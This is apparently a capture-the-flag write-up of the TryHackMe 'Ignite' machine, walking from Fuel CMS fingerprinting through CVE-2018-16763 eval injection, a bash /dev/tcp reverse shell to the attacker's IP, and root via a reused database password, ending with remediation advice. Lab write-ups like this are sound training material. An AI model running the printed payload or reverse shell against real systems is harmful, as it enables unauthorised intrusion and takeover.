# TryHackMe — Ignite

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 16.04) |
| **Date** | 2026-11-26 |
| **Skills** | CMS fingerprinting, public exploit (Fuel CMS CVE-2018-16763), reverse shell through PHP `system()`, credentials in config files, password reuse |

> Flags and recovered passwords are redacted, following TryHackMe's write-up guidelines.

## Summary

Only port 80 is open, running **Fuel CMS 1.4**. That version has an **unauthenticated remote code execution** (CVE-2018-16763): a URL parameter ends up inside a PHP `eval()`. A public exploit gives commands as **www-data**, which I turned into a reverse shell (after learning why `/dev/tcp` fails through PHP). The CMS's **database config file** holds a password for the database user `root`, and the system's root account **reuses the same password**: `su root` and done.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
sudo nmap -p 80 -sV -sC -oN services.txt <TARGET>
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

A single port, and the scripts already gave two leads: the **CMS name** in the title and a `/fuel/` path in robots.txt. With leads that concrete I skipped gobuster and went straight to the web.

## 2. Web — identifying the CMS

The home page is Fuel CMS's default welcome page and states the **version: 1.4**. `/fuel/` is the admin login panel.

A named CMS plus a version is the first thing to check for public vulnerabilities:

```bash
searchsploit fuel cms
```

```
fuel CMS 1.4.1 - Remote Code Execution (1)                 | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                 | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                 | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated) | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)       | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated) | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)         | php/webapps/50884.txt
```

Two filters narrowed it down: the SQL injections need **authentication** (I had no credentials), and the three RCEs cover **1.4.1**, which includes 1.4.

**My mistake:** I picked 50477 "because it's in `php/` and it's a `.py`". The folder says what platform the **target** runs on (a PHP web app), not the exploit's language; 47138 is also Python. The only way to know what an exploit does is to read it.

## 3. Initial access — CVE-2018-16763

```bash
searchsploit -x 50477
```

The header confirms `Version: <= 1.4.1`. The core of the exploit:

```python
while True:
    cmd = input("Enter Command $")
    main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"
    r = requests.get(main_url)
```

URL-decoded, the `filter` value is:

```
'+pi(print($a='system'))+$a('<COMMAND>')+'
```

Fuel passes `filter` into a PHP `eval()` without sanitising it. The payload closes the string with `'` and appends code that calls `system()` with my command. No login needed.

```bash
python3 50477.py -u http://<TARGET>
```

```
[+]Connecting...
Enter Command $whoami
systemwww-data
```

(The `system` prefix is printed by the payload's own `print($a='system')`.)

### From pseudo-shell to reverse shell

Each command is a separate HTTP request: no `cd`, nothing interactive. I started enumerating through it anyway and had to step back: get a real shell first.

Listener on Kali:

```bash
nc -lvnp 1234
```

**My mistakes here**, in order:

1. I first ran the reverse shell **in my own Kali terminal** instead of in the exploit's `Enter Command $` prompt. It has to run on the target. (Kali uses zsh, which has no `/dev/tcp` either, so it failed with `no such file or directory`.)
2. In the exploit prompt, `bash -i >& /dev/tcp/<MY_IP>/1234 0>&1` printed nothing and never connected.

The reason: PHP's `system()` runs commands with **`/bin/sh`**, which on Ubuntu is **dash**. `/dev/tcp/host/port` isn't a real file, it's a bash feature, and `>&` is bash syntax too. dash doesn't understand either and fails silently. Wrapping it makes dash just launch bash, which does:

```bash
bash -c "bash -i >& /dev/tcp/<MY_IP>/1234 0>&1"
```

Double quotes inside, because the exploit places the command inside a single-quoted PHP string; a `'` would break it.

Side note: TryHackMe's VPN now hands out `192.168.x.x` addresses on `tun0`, not only `10.x`. Check `ip a show tun0` instead of assuming.

The shell arrived. Stabilised it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This turned out to matter later: `su` needs a terminal to ask for a password.

The user flag is in `/home/www-data/flag.txt`.

## 4. Privilege escalation — config file + password reuse

`sudo -l` would ask for www-data's password, which I didn't have. SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

All standard Ubuntu binaries. **My mistake:** I flagged `vmware-user-suid-wrapper`, but it's part of the VMware guest tools and isn't on GTFOBins. The method: compare against a default install and check GTFOBins' SUID tab.

The actual path took me a while to see. I suggested SQLi, `/etc/passwd`, and `/etc/shadow` before getting there: a CMS connects to its database with a username and password, stored in a **config file inside the web root**, and www-data (the user running the web) can read it.

```bash
find /var/www/html -name "*database*" 2>/dev/null
cat /var/www/html/fuel/application/config/database.php
```

```php
$db['default'] = array(
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => '<redacted>',
	'database' => 'fuel_schema',
```

My first ideas were to log into the database or the CMS panel with these. Both are the long way: they give app users and hashes, while I already had code execution. The username is `root`, so the 2-second test is **password reuse** on the system account:

```bash
su root
```

```
# whoami
root
```

`root.txt` is in `/root`. Nothing was written to disk on the target, so there was nothing to clean up.

## Attack chain

```
nmap → port 80 → "Welcome to FUEL CMS" + robots.txt /fuel/
     → home page: version 1.4
     → searchsploit → 50477 (CVE-2018-16763, unauthenticated RCE via eval)
     → commands as www-data
     → bash -c "bash -i >& /dev/tcp/..." → reverse shell → pty
     → fuel/application/config/database.php → DB user root + password
     → su root with the same password → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Fuel CMS 1.4 with a known unauthenticated RCE | Update to a patched release; subscribe to the vendor's security advisories |
| User input passed to `eval()` | Never `eval()` request data; use parameterised logic |
| Version shown on the public home page | Remove default pages and version banners in production |
| Web app connects to MySQL as `root` | Dedicated database user with only the privileges the app needs |
| Database password reused for the system root account | Unique password per account and per service |
| Root login with a password via `su` | Disable direct root passwords; use sudo with named admin users |

## Lessons learned

- **A CMS name + version is the first lead**: searchsploit before brute force or directory scans.
- **Read the exploit before running it**, and filter by version and by whether it needs authentication. The searchsploit folder is the target's platform, not the exploit's language.
- **`/dev/tcp` is bash-only.** Through PHP `system()`, cron, or anything using `sh`, wrap the reverse shell in `bash -c "..."`.
- **Run payloads on the target, not on Kali.** Check the prompt before pressing Enter.
- **As www-data, read the web app's config files first**: database credentials are almost always there.
- **Try password reuse before the long way.** A password for a user called `root` is worth one `su`.
- **Stabilise the shell with `pty` early**: `su` and `sudo` need a terminal.
